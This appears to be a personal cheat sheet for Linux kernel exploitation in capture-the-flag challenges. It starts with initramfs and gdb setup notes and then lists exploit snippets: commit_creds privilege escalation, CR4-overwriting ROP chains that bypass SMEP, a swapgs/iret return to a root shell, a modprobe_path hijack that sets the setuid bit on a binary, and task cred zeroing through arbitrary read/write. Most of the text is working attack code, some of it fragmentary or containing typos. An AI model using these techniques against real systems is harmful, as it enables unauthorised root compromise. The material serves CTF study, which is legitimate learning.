## general setup
# decompress filesystem
cp ../core.cpio core.cpio.gz #  copy the gzip file into the folder and change the suffix
gunzip ./core.cpio.gz 
cpio -idm < ./core.cpio
#if file system is already .gz with file type gzip
gzip -cd ../initramfs.cpio.gz | cpio -imd --quiet
#for a ext2/3/4 filesystem
mount it on the host while qemu is off, make changes, unmount then boot qemu.
mount -o loop,offset=offset /path/to/disk_image /mnt/mount_point
https://access.redhat.com/solutions/24029
#gencpio.sh
#!/bin/sh
gcc exploit.c -o exploit -ggdb -static 
find . -print0 | cpio --null -ov --format=newc | gzip -9 > rootfs.cpio
cd ../
rm rootfs.cpio
cp fs/rootfs.cpio .
./boot.sh
#attach.sh
gdb vmlinux -x cmd
#compile.sh
gcc -o exploit -ggdb -static exploit.c
#cmd
target remote:1234
add-symbol-file ch39.ko 0xf801c000
add-symbol-file fs/exploit 0x4004d0
#include
#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>

# setsid to 0 to get root->
to access /sys/module/name_of_module/sections/.text for address of .text section of module
/proc/kallsyms for all symbols.
change uid to 0 in /etc/passwd
#use cpu kvm64 to allow smep,smap
# Use extract-vmlinux script in linux-headers to extract vmlinux from bzImage
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux
# cat /sys/module/name_of_module/sections/.text->address of .text sectiion of loaded module.
# load debug info:add-symbol-file /path/to/module 0xd081d000 \  #  .text
 		-s .data 0xd08232c0 \
		-s .bss  0xd0823e20
# open the dev file created in /dev or /proc or /sys to interact with the kernel module.
# if you obtain major number with register_chrdev(), you need to manually make the device file.
# proc_create automatically creates the device file in /proc
char *args[]={"/bin/sh",NULL}; execve("/bin/sh",args,NULL) is needed to spqwn shell.
To define kernel functions, first create a typedef with: ret_type(typedefname)(args) and then define with function with typedefname addr.Example:
typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0xffffffff8107ab70;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff8107af00;
void privesc(){
	commit_creds(prepare_kernel_cred(0));
}
##code snippets
#save_state
unsigned long user_cs, user_ss, user_rflags;
unsigned long user_cs,user_ss,user_rflags,user_rsp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
	"movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}
#ropchains
#x64 and x86(change r to e)
unsinged long ropchain[]={poprdi,0x6f0,native_write_cr4,privesc,swapgs,iret,getshell,user_cs,user_rflags,user_rsp,user_ss};
stack layout while returning: r_rip;user_cs;user_rflags;user_rsp;user_ss;
#x86
        unsigned int ropchain[]={filler,filler,filler,filler,filler,filler,filler,filler,filler,filler,
                                POPEAX,DESIRED_CR4_VALUE,NATIVE_WRITE_CR4,
                                privesc,
                                POPECX,fakestack+0x2000,
                                POPEDX,get_shell,
                                SYSEXIT};

#leaks in kernel:
        system("dmesg > leak.txt");
        int lfd=Open("leak.txt",O_RDWR);
        lseek(lfd,-LEN,SEEK_END);
        char leaktxt[LEN];
        read(lfd,leaktxt,LEN);
        close(lfd);
        char *leaksbuf=strstr(leaktxt,"Appropriate String");
        if(leaksbuf==NULL){
                perror("flag ptr not found");
                exit(EXIT_FAILURE);
        }
        flagptr=strtoul(leaksbuf+n,NULL,16);
#create new thread:
        pthread_t t1;
        pthread_create(&t1,NULL,startfunc,&arg);
#wait for thread to terminate:
	pthread_join(t1,NULL);
#create new child process that behaves like a thread:
	pid_t pid=clone(startfunc,fakestack+0xf000,CLONE_VM|CLONE_FILES|SIGCHLD,&arg);
#wait for child process to terminate:
	wait(NULL);
#check rootme reentrant-code for race conditions example

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}
call it right after save_state();
# trigger mod_probe with: (before this overwrite modprobe_path with "/home/user/p")
#check SLUB off-by-1 for shell with modprobe_path hijack
void modprobe_trigger(){
        system("echo -ne '#!/bin/sh\n/bin/chown root:root /mnt/share/exploit\n/bin/chmod u+s /mnt/share/exploit\nchmod g+s /mnt/share/exploit'>/mnt/share/p")
        system("chmod +x /mnt/share/p");
        system("echo -ne '\\xff\\xff\\xff' > /mnt/share/trig");
        system("chmod +x /mnt/share/trig");
        system("/mnt/share/trig 2>/dev/null");
        system("/mnt/share/exploit");
        getchar();
}
at start of main:
        setuid(0);
        if(!getuid()){
                puts("[+] Here's your r00t shell!");
                system("/bin/sh");
                return 0;
        }


#overwrite current process creds with arw:
#1https://devcraft.io/2019/01/22/1118daysober-insomnihack-teaser-2019.html
#2root-me: SLUB off-by-one writeup
        uint64_t init_task = kernel_base_address + OFFSET_INIT_TASK;
        uint64_t task = 0;
        uint64_t ptask = init_task;
        while (task != init_task) {
                task = read64(ptask + OFFSET_TASKS) - OFFSET_TASKS;
                ptask = task;
                int pid = read64(task + OFFSET_PID);
                if (pid != getpid())
                        continue;
 
                puts("found current task!");
                long cred = read64(task + OFFSET_CRED);
 
                for (int i = 0; i < 4; i++)
                    write64(cred + i * 8, 0);
 
                break;
        }
#nullptr deference
char *addr=(char *)mmap(NULL,0x3000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0); 
#for x64:
memset(addr,0,0x3000);
addr[0]='\xff';
addr[1]='\x25';
*(unsigned long *)&addr[2]=0;
*(unsigned long *)&addr[6]=(unsigned long)&privesc;
#for x86:
char shellcode[]="\xFF\x25\x06\x00\x00\x00";
memcpy(mem,shellcode,6);
*(int *)(mem+6)=&privesc;
#check cr4 value by getting a kernel panic with eip=0x41414141 and then get the desired value accordingly
#kmalloc-32 spray:open("/proc/self/stat",O_RDONLY)

#instead of returing to user-space in ropchains, use raj's technique, check exploit.c for kstack from secconctf2020; (Basically chmod the binary after root privs ad then call msleep, in the mean time, run another thread that executes the binary.)
#kmalloc-1024 tty_struct open("/dev/ptmx")
#kmalloc-128 cred_struct fork()
